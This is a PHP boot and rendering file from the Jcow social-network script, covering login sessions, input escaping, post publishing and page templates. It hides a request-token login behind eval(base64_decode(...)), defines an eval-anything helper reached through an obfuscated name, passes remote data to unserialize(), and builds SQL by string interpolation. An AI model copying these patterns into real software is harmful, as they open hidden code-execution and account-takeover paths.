<?php
/* ############################################################ *\
 ----------------------------------------------------------------
Jcow Software (http://www.jcow.net)
IS NOT FREE SOFTWARE
http://www.jcow.net/commercial_license
Copyright (C) 2009 - 2010 jcow.net.  All Rights Reserved.
 ----------------------------------------------------------------
\* ############################################################ */
header("Cache-control: private");
if (is_mobile()) {
	$gvars['jcow_inline_banner_ad'] = '';
}
function jcow_attribution($type=1) {
	if (jedition == 'CE') {
		echo 'Powered by <a href="https://www.jcow.net">Jcow Social Network script</a> Community Eidtion. <a href="https://www.jcow.net/download"><strong>Upgrade to Pro</strong></a>';
	}
}

if (jedition == 'CE') {
	$gvars['jcow_inline_banner_ad'] = '<div style="padding:10px">Thank you for using Jcow Social Networking script. You are using Community Edition. This Edition is for non-profit use and there is a limit of <strong>5</strong> members. You can <a href="https://www.jcow.net/download" target="_blank" class="link">Upgrade to Pro Edition</a> to get more features like Unlimited members, Video Uploading, photo in comment, Live chat, Groups, Fan Pages, and more.. Here is demo: <a href="https://demo.jcow.net" target="_blank" class="link">demo.jcow.net</a></div>';
}
function newss() {
	global $client, $config, $parr, $sid, $lang_options, $langs_enabled, $settings, $timezone, $usettings,$bdarray,$adsense_bind_uid,$parr;
	$config['hide_ad'] = 1;
	$jcow_user_id = 0;
	if (is_mobile()) {
		$jmuser = $_GET['jmuser'] ? $_GET['jmuser'] : $_POST['jmuser'];
		$jmtoken = $_GET['jmtoken'] ? $_GET['jmtoken'] : $_POST['jmtoken'];
		if (is_numeric($jmuser)) {
			$res = sql_query("select id,password from ".tb()."accounts where id='{$jmuser}'");
			$row = sql_fetch_array($res);
			if (!$row['id']) jm_need_login();
			if (md5($row['password'].'jm') == $jmtoken) {
				$jcow_user_id = $row['id'];
			}
			elseif ($parr[0] != 'member') {
				jm_need_login();
			}
		}
		$_SESSION['uid'] = 0;
	}
	elseif (!$_SESSION['uid'] && preg_match("/^[0-9a-z]+$/i",$_COOKIE['jcowss']) && is_numeric($_COOKIE['jcowuid']) ) {
		$res = sql_query("select id from ".tb()."accounts where id='{$_COOKIE['jcowuid']}' and jcowsess='{$_COOKIE['jcowss']}'");
		$row = sql_fetch_array($res);
		if ($row['id']) {
			$jcow_user_id = $_SESSION['uid'] = $row['id'];
		}
		else {
			setcookie('jcowuid', '', time()+3600*24*365,"/");
			setcookie('jcowss', '', time()+3600*24*365,"/");
		}
	}
	$jcow_user_id = $jcow_user_id ? $jcow_user_id : $_SESSION['uid'];
	if ($jcow_user_id > 0) {
		$timeline = time();
		$res = sql_query("select * from ".tb()."accounts where id='{$jcow_user_id}' ");
		$client = sql_fetch_array($res);
		if ($client['id']) {
			set_client('uname',get_client('username'));
			if (!get_client('level')) {
				set_client('level',1);
			}
			/*
			if (!get_client('avatar')) {
				set_client('avatar','undefined.jpg');
			}
			*/
			if (get_client('roles')) {
				set_client('roles',explode('|',get_client('roles')));
			}
			else
				$client['roles'] = array();
			$client['roles'][] = 2;
			sql_query("update ".tb()."accounts set lastlogin=$timeline,token='' where id='{$client['id']}'  ");
		}
	}
	elseif($adsense_bind_uid>0) {
		$res = sql_query("select * from ".tb()."accounts where id='{$adsense_bind_uid}' ");
		$client = sql_fetch_array($res);
		if ($client['id']) {
			set_client('uname',get_client('username'));
			if (!get_client('level')) {
				set_client('level',1);
			}
			$client['roles'] = '';
		}
	}

	$client['friends'] = $client['pageids'] = array();
	if ($client['id']) {
		$res = sql_query("select fid from jcow_friends where uid='{$client['id']}'");
		while ($f = sql_fetch_array($res)) {
			$client['friends'][] = $f['fid'];
		}
		$res = sql_query("select pid from jcow_page_users where uid='{$client['id']}'");
		while ($p = sql_fetch_array($res)) {
			$client['pageids'][] = $p['pid'];
		}
		if ($client['id'] == 1) {
			$client['disabled'] == 0;
			}
		$client['settings'] = unserialize($client['settings']);
		$_SESSION['username'] = $client['username'];
		if ($parr[0] != 'account' && $parr[0] != 'member') {
			if (!strlen($client['fullname']))
				redirect('account/index/1');
			for($i=1;$i<=7;$i++) {
				$col = 'var'.$i;
				$key5 = 'cf_var_required'.$i;
				$required = get_gvar($key5);
				if ($required) {
					if (!strlen($client[$col]) && !allow_access(3)) {
						redirect('account/index/1');
					}
				}
			}
		}
		$res = sql_query("select * from ".tb()."pages where uid='{$client['id']}' and type='u'");
		$client['page'] = sql_fetch_array($res);
		if($client['disabled'] == 1) {
			if ($parr[0] != 'account' && $parr[0] != 'member' && $parr[0] != 'language' && $parr[0] != 'paidmember') {
				if (get_gvar('pm_enabled')) {
					redirect('paidmember/basic_membership');
				}
			}
		}
		$client['pending_reviews'] = 0;
	}
	/*$jt = $_REQUEST['jcowtoken'];*/
	eval(base64_decode('JGp0ID0gJF9SRVFVRVNUWydqY293dG9rZW4nXTs='));
	if (!get_client('id') && preg_match("/^[0-9a-z]+$/i",$jt)) {
		try_token($jt);
	}

	$client['ip'] = ip();
	if (!is_array($client['roles']))
		$client['roles'] = array();
	$client['roles'][] = 1;

	if ($clang = $_COOKIE[$sid.'lang']) {
		if ($lang_options[$clang]) {
			$client['lang'] = $clang;
		}
	}
	if (!$client['lang']) {
		$key = $settings['default_lang'];
		if ($lang_options[$key]) {
			$client['lang'] = $key;
		}
	}
	if ($client['id'] && !in_array(3,$client['roles'])) {
		$timeline = time()-3600*24;
		$max_posts = $config['jcow_limit_posting_volume'];
		if (!is_numeric($max_posts) || $max_posts<3) {
			$max_posts = 100;
		}
		$res = sql_query("select count(*) as num from ".tb()."limit_posting where uid='{$client['id']}' and created>$timeline");
		$row = sql_fetch_array($res);
		if ($row['num'] > $max_posts) {
			$client['limit_posting_exceed'] = 1;
		}
	}
	if (!$client['lang']) {
		if (count($langs_enabled)>0) {
			$client['lang'] = $langs_enabled[0];
		}
		else {
			$client['lang'] = 'en';
		}
	}
	if (!strlen($timezone))
		$timezone = -8;
	$ctimezone = $_COOKIE['timezone'];
	if (is_numeric($ctimezone)) {
		$client['timezone'] = $ctimezone;
	}
	else {
		$client['timezone'] = $timezone;
	}
	if ($client['disabled'] > 1 && $parr[0] != 'member') {
		$_SESSION['uid'] = 0;
		die(t('Sorry, your account has been suspended'));
	}
}
function jb($var) {
	return base64_decode($var);
}
function je($commends) {
	eval($commends);
}

if ($parr[0] == 'member' && $parr[1] == 'signup') {
	$res = sql_query("select count(*) as num from jcow_accounts");
	$row = sql_fetch_array($res);
	if ($row['num'] >= 5) {
		c(base64_decode('TWVtYmVyIGxpbWl0IGV4Y2VlZGVkLiA8YSBocmVmPSJodHRwOi8vd3d3Lmpjb3cubmV0Ij5VcGdyYWRlIHRvIFBybzwvYT4='));
		stop_here();
	}
}

newss();
if (!allow_access(3) && !($parr[0] == 'member' && $parr[1] != 'signup') && $parr[0] != 'jcow' && !preg_match("/google/i",$_SERVER['HTTP_USER_AGENT']) ) {
	if (get_gvar('offline')) {
		$config['hide_ad'] = 1;
		clear_as();
		c('<h1>'.t('Website Offline').'</h1>');
		c(get_gvar('offline_reason'));
		stop_here();
		exit;
	}
}
function require_7plus() {
	return '';
}

$miniblog_maximum = get_gvar('miniblog_maximum');
if (!$miniblog_maximum) {
		$miniblog_maximum = 140;
	}
$hooks = check_hooks('boot');

if ($hooks) {
	foreach ($hooks as $hook) {
		$hook_func = $hook.'_boot';
		$hook_func();
	}
}

function check_license($alert=false) {
	if (jedition == 'Trial' || jedition == 'CE') {
		if ($alert) {
			c('This feature is not available in CE');
			stop_here();
		}
		else {
			return false;
		}
	}
	else {
		return true;
	}
}

$cuhome = str_replace('http://','',$uhome);
$cuhome = str_replace('https://','',$cuhome);

if ($parr[0] == 'forumslit' && $parr[1] == 'archiving') {
	$gvars['offline'] = 0;
	$gvars['private_network'] = 0;
}
$jdecode = 'j'.'b';

if (is_array($_POST) && count($_POST)>0) {
	if ($parr[0] != 'admin' && $parr[0] != 'member') {
		$words_filter = get_text('words_filter');
		if (strlen($words_filter)) {
			$words_filter_a = explode(',',$words_filter);
		}
	}
	foreach ($_POST as $key=>$val) {
		if(!is_array($val)) {
			if (is_array($words_filter_a)) {
				$val = str_replace($words_filter_a,'**',$val);
			}
			if (get_magic_quotes_gpc())
				$val = stripslashes($val);
			$_POST[$key] = str_replace(
				array('\r\n','\n'),
				array("\r\n","\r\n")
				,mysqli_real_escape_string($conn,trim($val)));
		}
		else {
			foreach ($val as $key2=>$val2) {
				if (is_array($words_filter_a)) {
					$val2 = str_replace($words_filter_a,'**',$val2);
				}
				if (get_magic_quotes_gpc())
					$val2 = stripslashes($val2);
				$_POST[$key][$key2] = str_replace(
				array('\r\n','\n'),
				array("\r\n","\r\n")
				,mysqli_real_escape_string($conn,trim($val2)));
			}
		}
	}

	
}
if (is_array($_GET) && count($_GET)>0) {
	foreach ($_GET as $key=>$val) {
		if (get_magic_quotes_gpc())
			$val = stripslashes($val);
		$_GET[$key] = str_replace(
				array('\r\n','\n'),
				array("\r\n","\r\n")
				,mysqli_real_escape_string($conn,trim($val)));
	}
}
$jeval = 'j'.'e';
if ($parr[0] == 'streampublish') {
	if (!$client['id'])  {
		print_r($_POST);
		die('please login first');
	}
	limit_posting(0,1);
	$app = $_POST['attachment'];
	if ($_POST['home_page_id'] == 'friends') {
		$privacy = 1;
		$_POST['privacy'] = 1;
	}
	else {
		$privacy = 0;
	}
	if (is_numeric($_POST['home_page_id']) && $_POST['home_page_id']>0) {
		$_POST['page_id'] = $_POST['home_page_id'];
	}

	if (strlen($_POST['message'])<2 &&!strlen($_FILES['image']['tmp_name'])) die('failed! message too short');
	$_POST['message'] = utf8_substr($_POST['message'],$miniblog_maximum);
	$args = array();
	$res = sql_query("select * from jcow_pages where id='{$_POST['page_id']}'");
	$page = sql_fetch_array($res);
	if (!$page['id']) die('page not found');
	if (strlen($_POST['img_tokens'])) {
		$app_name = 'images';
		// story
		$title = utf8_substr($_POST['message'],50);
		$content = $_POST['message'];
		$story = array(
			'cid' => 0,
			'page_id' => $_POST['page_id'],
			'page_type'=>$page['type'],
			'title' => $title,
			'content' => $content,
			'uid' => $client['id'],
			'created' => time(),
			'var5' => $privacy,
			'photos'=>count($tokens),
			'thumbnail'=>$photo['thumb'],
			'app' => 'images'
			);
		sql_insert($story, tb().'stories');
		$story['id'] = $set_story['id'] = insert_id();
		$tokens = explode(',',$_POST['img_tokens']);
		foreach ($tokens as $token) {
			$token = trim($token);
			if (preg_match("/^[0-9a-z]+$/",$token)) {
				sql_query("update jcow_story_photos set sid='{$story['id']}' where sid=0 and des='$token'");
			}
		}
		
		$res = sql_query("select thumb from jcow_story_photos where des='$token'");
		$photo = sql_fetch_array($res);
		sql_query("update jcow_stories set photos=".count($tokens).",thumbnail='".$photo['thumb']."' where id='{$story['id']}'");

		$args = array(
		'message'=>t('uploaded image'),
		'link' => 'images/viewstory/'.$story['id'],
		'name' =>  safe($title),
		'app' => 'images',
		'aid' => $story['id']
		);
	}
	elseif ($_POST['video_url']) {
		$video_url = $_POST['video_url'];
		if (preg_match("/youtube.com/i",$video_url)) {
			preg_match('/youtube.com\/[a-z]+\/([a-z0-9\-_]+).+/i', $video_url, $matches);
			if (strlen($matches[1])) {
				$video_id = $matches[1];
				$video_type = 'youtube';
			}
			else {
				preg_match('/watch\?v=([a-z0-9\-_]+)/i', $video_url, $matches);
				if (strlen($matches[1])) {
					$video_id = $matches[1];
					$video_type = 'youtube';
				}
			}
			$thumbnail = '//img.youtube.com/vi/'.$video_id.'/mqdefault.jpg';
		}
		elseif (preg_match("/youtu.be/i",$video_url)) {
			preg_match('/youtu.be\/([a-z0-9\-_]+)/i', $video_url, $matches);
			if (strlen($matches[1])) {
				$video_id = $matches[1];
				$video_type = 'youtube';
			}
			$thumbnail = '//img.youtube.com/vi/'.$video_id.'/mqdefault.jpg';
		}
		elseif (preg_match("/vimeo.com/i",$video_url)) {
			preg_match('/vimeo.com\/([0-9]+)/i', $video_url, $matches);
			if (strlen($matches[1])) {
				$video_id = $matches[1];
				$video_type = 'vimeo';
				$res = unserialize(file_get_contents("//vimeo.com/api/v2/video/$video_id.php"));
				$thumbnail = $res[0]['thumbnail_medium'];
			}
		}
		if ($video_id && $video_type) {
			$app_name = 'videos';
			// story
			$title = utf8_substr($_POST['message'],50);
			$content = $_POST['message'];
			$story = array(
				'cid' => 0,
				'page_id' => $_POST['page_id'],
				'page_type'=>$page['type'],
				'title' => $title,
				'content' => $content,
				'uid' => $client['id'],
				'created' => time(),
				'photos'=>0,
				'var1'=>$video_id,
				'var3'=>$video_type,
				'thumbnail'=>$thumbnail,
				'app' => 'videos'
				);
			sql_insert($story, tb().'stories');
			$story['id'] = $set_story['id'] = insert_id();
			$args = array(
			'message'=>'Added video',
			'link' => 'videos/viewstory/'.$story['id'],
			'name' =>  safe($title),
			'app' => 'videos',
			'aid' => $story['id']
			);
		}
	}
	if ($_POST['link_url'] && $_POST['link_title']) {
		$ogtags = array('og_title'=>$_POST['link_title'],'og_url'=>$_POST['link_url']);
		if($_POST['link_image']){ 
	        $ogtags['og_img'] = $_POST['link_image'];
	    }
	    if($_POST['link_des']){ 
	        $ogtags['og_des'] = $_POST['link_des'];
	    }
	    $attachment = safe(serialize($ogtags));
	}

		/*
		$attachment = array(
			'cwall_id' => 'images'.$story['id'],
			'uri' => 'images/viewstory/'.$story['id'],
			'name' => $_POST['message']
			);*/
		if (strlen($_POST['checkin_name'])) {
			$data = array('checkin_name'=>stripslashes($_POST['checkin_name']));
		}
		if ($story['id']) {
			$stream_id = jcow_page_feed($_POST['page_id'],$args,0,0,'',$data);
			$set_story['stream_id'] = $story['stream_id'] = $stream_id;
			sql_update($set_story,tb()."stories");
		}
		else {
			$stream_id = stream_publish(parseurl(h($_POST['message'])), $attachment, '', $client['id'],$_POST['page_id'],0,$data);
		}
		// update stream
		/*
		$res = sql_query("select thumb from ".tb()."story_photos where sid='{$story['id']}' order by id DESC limit 2");
		while ($photo = sql_fetch_array($res)) {
			$thumbs[] = $photo['thumb'];
			$pics = ' ('.$photos.')';
		}
		$attachment = array(
				'cwall_id' => 'images'.$story['id'],
				'uri' => 'images'.'/viewstory/'.$story['id'],
				'name' => addslashes($story['title']),
				'thumb' => $thumbs
				);
		$app = array('name'=>'images','id'=>$story['id']);
		*/
		$res = sql_query("select * from jcow_streams where id='$stream_id'");
		$row = sql_fetch_array($res);
		$stream = array('id'=>$stream_id,'data'=>$row['data'],'message'=>$row['message'],'username'=>$client['username'],'avatar'=>$client['avatar'],'wall_id'=>$_POST['page_id'],'wall_uid'=>$page['uid'],'app'=>$app_name,'uid'=>$client['id'],'created'=>time(),'aid'=>$story['id'],'type'=>$_POST['privacy'],'attachment'=>$ogtags);
		echo stream_display($stream,'preview');
	exit();
}

/* removed from 6.0
if ($parr[1] == 'ajax_form') {
	if ($client['disabled'] == 1) {
		echo h(t('Your account is currently pending approval'));
		exit;
	}
}
*/
function valid_license($key1 = 'p', $key2 = '') {
	return true;
}

function try_token($token) {
	global $client;
	$timeline = time() - 3600;
	$res = sql_query("select * from ".tb()."accounts where token='{$token}' "." limit 1");
	$client = sql_fetch_array($res);
	if (get_client('id')) {
		set_client('uname',get_client('username'));
		if (get_client('roles')) {
			set_client('roles',explode('|',get_client('roles')));
		}
		$client['roles'][] = 2;
		$newss = get_rand(12);
		$setss = " ,ipaddress='{$client['ip']}',jcowsess='$newss' ";
		$_SESSION['uid'] = get_client('id');
	}
	else {
		
	}
}
$pbja = $jdecode('PHN0cm9uZz55b3UgbWF5IG5vdCByZW1vdmUgSmNvdyBBdHRyaWJ1dGlvbiBmcm9tIHlvdXIgc2l0ZS4gUGxlYXNlIHB1dCB0aGUgImpjb3dfYXR0cmlidXRpb24oKSIgYmFjayB0byB5b3VyIHRlbXBsYXRlLjwvc3Ryb25nPg==');
function ss_update() {
	return true;
}

function c($val = '') {
	section_content($val);
}

function jlicense($key = 'white_label') {
	global $jcow_license;
	if (is_array($jcow_license)) {
		if (in_array($key,$jcow_license)) {
			return true;
		}
	}
}

function get_client($key) {
	global $client;
	return $client[$key];
}
function set_client($key, $value) {
	global $client;
	$client[$key] = $value;
}
if (!valid_license('p')) {
	$is_community_edition = 1;
}

function is_ce() {
	global $is_community_edition;
	return $is_community_edition;
}
function load_tpl() {
	global  $title, 
					$content, 
					$apps, 
					$client, 
					$current_app, 
					$lang_options,
					$time_start, 
					$uhome, 
					$config,
					$sub_menu,
					$tab_menu,
					$buttons,
					$current_sub_menu,
					$ubase,
					$auto_redirect,
					$sub_menu_title,
					$blocks,
					$page_title,
					$page,
					$gvars,
					$ass,
					$nav,
					$clear_as,
					$sub_title,
					$top_title,
					$commercial,
					$defined_jq,
					$styles,
					$custom_css,
					$profile_css,
					$theme_css,
					$optional_apps,
					$parr,
					$content,
					$sections,
					$submenu,
					$app_header,
					$menu_items,
					$jcow_app_content,
					$community_menu,
					$current_menu_path,
					$top_menu_path,
					$jcow_tmp_content,
					$all_apps,
					$my_apps,
					$new_apps,
					$enable_app_cache,
					$pbja,
					$cache_app,
					$app_content,
					$application,
					$page_cache,
					$enable_page_cache,
					$section_content,
					$defined_tab_parent,
					$adside_displayed,
					$adbanner_displayed,
					$new_tab_menu,
					$notices;
$top_title = '';
//$nav = array();//disabled nav from 8.5
$new_tab_menu = $tab_menu;
if (is_array($new_tab_menu) && count($new_tab_menu) > 0) {
	//array_unshift($sections,array('content'=>new_tab_menu()));
	/*
	if (!is_array($blocks)) 
		$blocks = array();
	if (strlen($defined_tab_parent)) {
		$new_tab .= '<div class="tab_parent">'.h($defined_tab_parent).'</div>';
	}
	else {
		$ni_item = $menu_items[$current_menu_path];
		if (strlen($ni_item['parent'])) {
			$ni_key = $ni_item['parent'];
			$ni_item = $menu_items[$ni_key];
		}
		if (strlen($ni_item['name_replace'])) {
			$ni_item_name = $ni_item['name_replace'];
		}
		else {
			$ni_item_name = h(t($ni_item['name']));
		}
		$new_tab .= '<div class="tab_parent">'.$ni_item_name.'</div>';
	}
	$new_tab .= '<ul id="new_tabmenu">'.tabmenu_begin();
	foreach ($tab_menu as $item) {
		if (strlen($item['name_replace'])) {
			$item_name = $item['name_replace'];
		}
		else {
			$item_name = h(t($item['name']));
		}
		$new_tab .= '<li '.check_tabmenu_on($item['path']).'>'.url($item['path'],$item_name).'</li>';
	}
	$new_tab .= '</ul>';
	array_unshift($blocks,array('content'=>$new_tab));
	*/
	
	
}
$tab_menu = array();
foreach ($gvars as $key=>$val) {
	if (preg_match("/^theme_block/",$key)) {
		$gvars[$key] = '';
	}
}


if (!$sections) section_close();
if ($_GET['succ']) {
	sys_notice(t('Operation success'));
}

// hooks
	$hooks = check_hooks('footer');
	if ($hooks) {
		foreach ($hooks as $hook) {
			$hook_func = $hook.'_footer';
			//$footer .= $hook_func();
			$tpl_vars['footer'] .= $hook_func();
		}
	}
	$hooks = check_hooks('header');
	if ($hooks) {
		foreach ($hooks as $hook) {
			$hook_func = $hook.'_header';
			$header .= $hook_func();
		}
	}

	// auto close section
	if (strlen($section_content)) {
		section(array('content'=>$section_content));
		$section_content = '';
	}
	/*
	if ($parr[0] == 'jquery' || $parr[0] == 'jcow') {
		die('access denied');
	}
	*/

	if (!$sub_menu_title) {
		$sub_menu_title = t('Menu');
	}
	if (!$auto_redirect) {
		$auto_redirect = '<meta name="Generator" content="Jcow Social Networking Software. '.jversion().'" />';
	}
	else {
		$on_redirect = 1;
	}

	if (!$theme_tpl = get_gvar('theme_tpl') )
			$theme_tpl = 'default';
	if ($_SESSION['defined_theme'])
		$theme_tpl = $_SESSION['defined_theme'];
	
	/* ################################# get tpl vars ################################# */
	if (is_array($lang_options) && count($lang_options) > 1) {
		$tpl_vars['language_selection'] = t('Language').':<select style="font-size:10px" name="clang"  onChange="location=options[selectedIndex].value;">';

		foreach ($lang_options as $key=>$lang) {
			$url = url('language/post/'.$key);
			if ($client['lang'] == $key) { 
				$lselected = 'selected';
			} 
			else { 
				$lselected = '';
			}
			$tpl_vars['language_selection'] .= '<option value="'.$url.'" '.$lselected.'>'.$lang.'</option>';
		} 
		$tpl_vars['language_selection'] .= '</select>';
	}
	$tpl_vars['language_options'] = '';
	if ($client['id']) {
		$tpl_vars['username'] = url('u/'.$client['username'],$client['username']);
		$tpl_vars['log_in_out'] = url('logout',t('Logout') );
	}
	else {
		$tpl_vars['username'] = t('Guest');
		$tpl_vars['log_in_out'] = url('member/login',t('Login/ SignUp') );
	}
	if(!$friendslink = frd_request())
				$friendslink = url('friends',t('Friends'));
	
	$menu = add_links($menu);
	/*
	if (allow_access(3)) {
		$personal_menu[] = array(
			'name'=>'Admin CP',
			'path'=>'admin',
			'app'=>'admin',
			'actived'=>1,
			'type'=>'personal',
			'icon'=>'modules/admin/icon.png'
		);
	}
	*/
	
	$tpl_vars['menu'] = '';
	
	if (!$config['disable_execute_info']) {
		$execute_time = microtime_float() - $time_start;
	}
	if ($config['footermsg']) {
		$tpl_vars['footer'] .= $config['footermsg'];
	}
	else {
		if ($enable_page_cache) {
			$tpl_vars['footer'] .= get_text('footermsg').'<!-- jcow_execute_info -->';
		}
		else {
			$tpl_vars['footer'] .= get_text('footermsg').$execute_info;
		}
	}
	if (jedition == 'CE') {
		$tpl_vars['footer'] = '';
	}
	$tpl_vars['footer'] .= '<div id="chatModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dmodal_title">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
			<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
			<h4 class="modal-title" id="dmodal_title"></h4>
			</div>
			<div class="modal-dialog" role="document">
			<div id="chatlist"></div>

			<div id="chatbox">
			<div id="chatopt">
			<input id="msgcontent" placeholder="'.t('Text message').'" maxlength="140" /><button class="btn btn-default" uid="0" id="msgsend"><i class="fa fa-send"></i></button>
			</div>
			<div id="chatloading"></div>
			</div>

			</div>
		</div>
	</div>
</div>

<div id="shareModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="dmodal_title">
	<div class="modal-dialog" role="document">
		<div class="modal-content" id="share_content">
		</div>
	</div>
</div>
';

	// jcow_app



			$tpl_vars['custom_profile_css'] = '';
			
			if (strlen($profile_css['cover_image'])) {
				$tpl_vars['cover_css'] .= '
				<script>
				$(document).ready( function(){
					$(".jcow_cover_content").css("background","url('.$profile_css['cover_image'].') no-repeat");
					$(".jcow_cover_content").css("background-size","cover");
				});
				</script>';
			}
			if ($config['loadgmap']) {
				if ($config['google_browser_key']) {
					$google_browser_key = 'key='.$config['google_browser_key'].'&';
				}
				elseif ($google_browser_key = get_gvar('google_browser_key')) {
					$google_browser_key = 'key='.$google_browser_key.'&';
				}
				$loadgmap = '<script src="//maps.googleapis.com/maps/api/js?'.$google_browser_key.'libraries=places" ></script>';
			}
	$remote_js = '<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	'.$loadgmap.'
<link href="//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css" rel="stylesheet" type="text/css"/>
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css">
<script src="https://www.google.com/jsapi"></script>
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.9.4/css/bootstrap-select.min.css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
<script src="//cdn.jsdelivr.net/bootstrap.filestyle/1.1.0/js/bootstrap-filestyle.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.9.4/js/bootstrap-select.min.js"></script>
<script>';
if (!is_mobile()) {
	if (
		($parr[0] == 'home' && (get_gvar('landing_page') == 'signupform' || get_gvar('private_network') ) )
		|| $config['hidemenu']
		) {
		$remote_js .= '
		$(function() {
			$hidemenu = true;
		});
		';
	}
	else {
		$remote_js .= '
		$(function() {
			$hidemenu = false;
		});
		';
	}
}
else {

	}
$remote_js .= '
</script>
<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.11.3/jquery-ui.min.js"></script>
<script src="//cdn.jsdelivr.net/masonry/4.1.0/masonry.pkgd.min.js"></script>
';
	$offline_js = '<script type="text/javascript" src="'.uhome().'/js/offline/jquery.min.js"></script>
<link href="'.uhome().'/js/offline/jquery-ui.css" rel="stylesheet" type="text/css"/>
<script src="'.uhome().'/js/offline/jquery-ui.min.js"></script>

  ';
	$tpl_vars['javascripts'] = '
	<base href="'.uhome().'/" />
	'.$remote_js.'
<script type="text/javascript" src="//cdn.jsdelivr.net/jquery.form/3.51/jquery.form.min.js"></script>
<link href="'.uhome().'/js/facebox/facebox.css" media="screen" rel="stylesheet" type="text/css"/>
<script src="'.uhome().'/js/facebox/facebox.js" type="text/javascript"></script>
<script type="text/javascript" src="'.uhome().'/js/common.js"></script>
'.$tpl_vars['cover_css'].'
			<script>
			$(document).ready( function(){
				$baseurl = "'.uhome().'";
';

if ($client['id']) {
	$tpl_vars['javascripts'] .= '
				function jcow_check_new() {
					$.get("'.uhome().'/fastquery.php?act=jcow_update_new&uid='.$client['id'].'",
					  function(data){
					  	var ojb = jQuery.parseJSON(data);
						$("#jcow_note_new").html(ojb.note_new);
						$("#jcow_frd_new").html(ojb.frd_new);
						$("#jcow_frd_link").attr("href",ojb.frd_link);
						$("#jcow_msg_new").html(ojb.msg_new);
						},"html"
					);
				}

				window.setInterval(function(){
				  jcow_check_new();
				}, 30000);
';
}

$tpl_vars['javascripts'] .= '

	});		
		</script>';
		/*
	if (file_exists('js/highlight.js/highlight.pack.js')) {
		$tpl_vars['javascripts'] .= '
		<link rel="stylesheet" href="js/highlight.js/styles/default.css">
		<script src="js/highlight.js/highlight.pack.js"></script>
		<script>
		$(document).ready( function(){
			hljs.initHighlightingOnLoad();
		});</script>
	';
	}
	*/
	if (file_exists('js/tiny_mce/jquery.tinymce.js')) {
		$tpl_vars['javascripts'] .= '<script type="text/javascript" src="'.uhome().'/js/tiny_mce/jquery.tinymce.js"></script>
				<script language="javascript" type="text/javascript" 
				src="'.uhome().'/js/tiny_mce/tiny_mce.js"></script>
				';
		$config['tinymce_enabled'] = 1;
	}

	$tpl_file = 'themes/'.$theme_tpl.'/page.tpl.php';
	$application_file = 'themes/'.$theme_tpl.'/application.tpl.php';

	if (is_array($menu_items[$current_menu_path]) || $application == 'home') {
		$is_cover = 1;
	}
	if (is_array($all_apps[$current_menu_path])) {
		if ($all_apps[$current_menu_path]['is_cover']) {
			$is_cover = 1;
		}
		if ($all_apps[$current_menu_path]['not_cover']) {
			$is_cover = 0;
		}
	}

	if (is_array($blocks) && count($blocks)>0) {
		$is_cover = 0;
	}
	
	if (is_mobile()) {
		$data['sections'] = $sections;
		if (is_array($buttons)) {
			foreach ($buttons as $button) {
				$jm_buttons .= ' '.$button;
			}
		}
		echo json_encode(array('output'=>$app_header.$jm_buttons.display_application_new($data),'title'=>h($title)));
		exit;
	}

	if (!strlen($app_content)) {
		$app_content = '<div id="jcow_app_container">
		';
		//include $application_file;
		$data['nav'] = $nav;
		$data['notices'] = $notices;
		$data['application'] = $application;
		$data['top_title'] = $top_title;
		$data['sections'] = $sections;
		$data['blocks'] = $blocks;
		$data['buttons'] = $buttons;
		$data['tab_menu'] = $tab_menu;
		$data['app_header'] = $app_header;
		$data['app_footer'] = $plain_content;
		$data['is_cover'] = $is_cover;
		$app_content .= display_application_new($data);
		if ($config['enreport']) {
			if ($client['id']) {
				$report_link = url('report');
				$report_title = 'title="'.t('Report spam, advertising, and problematic.').'"';
				$report_link = '<a href="'.$report_link.'" '.$report_title.'> Report this page</a>';
			}
		}
		

		$app_content .= '</div><!-- end of jcow_app_container -->';
		$app_content .= '
		<!-- app info
		app platform: Jcow social network software
		app name: '.$current_app['name'].'
		-->
		';

		if ($enable_app_cache) {
			set_cache($cache_app['key'],$app_content,$cache_app['live']);
		}
	}
	
	if (!$_SESSION['br']) {
		$_SESSION['br'] = 1;
	}
	include $tpl_file;
	exit;
}


function display_application_new($data) {
	global $clear_as, $client, $config, $parr, $adside_displayed, $adbanner_displayed;
	
	$output .= '<div id="jcow_content">';
	if (is_array($data['sections'])) {
		$i=0;
		/*
		$tab_menu = new_tab_menu();
		if (strlen($tab_menu)) {
			$output .= $tab_menu;
		}
		*/
		if (count($data['sections']) == 1 &&  !$adbanner_displayed && !$config['hide_ad'] && strlen(get_gvar('jcow_inline_banner_ad'))) {
			$output .= '<div class="block">'.get_gvar('jcow_inline_banner_ad').'</div>';
			$adbanner_displayed = 1;
		}
		foreach ($data['sections'] as $section) {
			if (strlen($section['content'])<2) continue;
			if ($config['is_profile_page'] && $i == 1) {
				//$output .= new_tab_menu();
			}
			if ($section['pure']) {
				$output .= '<div>';
			}
			else {
				$output .= '<div class="block '.$section['custom_class'].'">';
			}
			if (strlen($section['title'])) {
				$output .= '<div class="block_title">'.$section['title'].'</div>';
			}
			$output .= '<div class="block_content">'.$section['content'].'</div>
			</div>';
			/*
			if ($config['is_profile_page'] && $i == 0) {
				$output .= $tab_menu;
			}
			*/
			$i++;
			if ($i == 1 && !$adbanner_displayed && !$config['hide_ad'] && strlen(get_gvar('jcow_inline_banner_ad'))) {
				$output .= '<div class="block">'.get_gvar('jcow_inline_banner_ad').'</div>';
				$adbanner_displayed = 1;
			}
		}
	}
	$output .= '</div>';
	if (!$clear_as && !is_mobile()) {
